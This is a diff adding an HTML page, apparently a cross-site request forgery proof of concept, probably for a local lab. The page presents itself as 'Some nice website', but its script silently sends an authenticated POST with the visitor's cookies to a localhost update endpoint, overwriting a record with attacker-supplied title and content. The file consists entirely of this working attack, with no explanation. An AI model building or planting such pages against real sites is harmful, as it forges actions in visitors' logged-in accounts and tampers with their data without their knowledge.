@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h1>Some nice website</h1>
+
+    <script>
+        const slug = "3e2e62cf-35f2-4d8e-9244-8649a4748c52"
+
+        fetch(`http://localhost:8000/update/${slug}`, {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: "title=attacker&content=attacker"
+        })
+            .then(res => res.text())
+            .then(text => console.log(text))
+            .catch(err => console.error(err));
+    </script>
+</body>
+
+</html>
